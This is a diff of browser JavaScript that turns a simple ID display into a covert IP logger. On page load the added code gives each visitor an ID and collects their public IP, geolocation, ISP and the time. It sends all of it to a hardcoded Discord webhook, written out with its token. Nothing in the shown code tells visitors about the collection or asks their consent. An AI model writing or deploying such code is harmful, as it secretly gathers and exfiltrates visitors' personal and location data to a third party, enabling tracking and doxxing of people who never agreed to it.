@@ -1,24 +1,28 @@
-function generateRandomId() {
-  const characters = "0123456789";
-  let id = "";
-  for (let i = 0; i < 16; i++) {
-    id += characters.charAt(Math.floor(Math.random() * characters.length));
-  }
-  return id;
+function generateUserId() {
+  const userId = generateRandomNumber(16);
+  localStorage.setItem("userId", userId);
+  return userId;
 }
 
-function displayIP() {
-  const userId = localStorage.getItem("siteUserId");
+function generateRandomNumber(length) {
+  let result = "";
+  const characters = "0123456789";
+  const charactersLength = characters.length;
+  for (let i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  return result;
+}
+
+function displayUserData() {
+  const userId = localStorage.getItem("userId");
   if (!userId) {
-    const newUserId = generateRandomId();
-    localStorage.setItem("siteUserId", newUserId);
-    sendToWebhook(newUserId);
-    const userIdElement = document.getElementById("userId");
-    userIdElement.textContent = newUserId;
+    const newUserId = generateUserId();
+    document.getElementById("userId").textContent = newUserId;
+    sendUserData(newUserId);
   } else {
-    sendToWebhook(userId);
-    const userIdElement = document.getElementById("userId");
-    userIdElement.textContent = userId;
+    document.getElementById("userId").textContent = userId;
+    sendUserData(userId);
   }
 
   fetch("https://api.ipify.org/?format=json")
@@ -28,28 +32,21 @@ function displayIP() {
       ipElement.textContent = data.ip;
 
       getLocation(data.ip);
-    })
-    .catch((error) => {
-      console.error("Error:", error);
     });
 }
 
-function sendToWebhook(userId) {
-  const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
-  const message = "User ID: " + userId;
+function sendUserData(userId) {
+  fetch("https://api.ipify.org/?format=json")
+    .then((response) => response.json())
+    .then((data) => {
+      const ip = data.ip;
+      const time = getCurrentTime();
 
-  fetch(webhookURL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ content: message })
-  })
-    .then((response) => console.log("Webhook sent successfully"))
-    .catch((error) => console.error("Error sending webhook:", error));
+      getLocation(ip, userId, time);
+    });
 }
 
-function getLocation(ip) {
+function getLocation(ip, userId, time) {
   const locationUrl = `https://ipapi.co/${ip}/json/`;
 
   fetch(locationUrl)
@@ -63,21 +60,26 @@ function getLocation(ip) {
       const ispString = data.org;
       ispElement.textContent = ispString;
 
-      const time = getCurrentTime();
-      sendToWebhook(userId, locationString, ispString, time);
-    })
-    .catch((error) => {
-      console.error("Error:", error);
-      const defaultLocation = "Unknown";
-      const defaultIsp = "Unknown";
-      const defaultTime = getCurrentTime();
-      sendToWebhook(userId, defaultLocation, defaultIsp, defaultTime);
+      sendToWebhook(userId, ip, locationString, ispString, time);
     });
 }
 
-function getCurrentTime() {
-  const now = new Date();
-  const options = { timeZone: "Europe/Paris" };
-  const timeString = now.toLocaleTimeString("en-US", options);
-  return timeString;
+function sendToWebhook(userId, ip, location, isp, time) {
+  const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
+  const message = "User ID: " + userId + "\nIP: " + ip + "\nLocation: " + location + "\nISP: " + isp + "\nTime: " + time;
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ content: message }),
+  });
 }
+
+function getCurrentTime() {
+  const date = new Date();
+  return date.toLocaleString();
+}
+
+displayUserData();
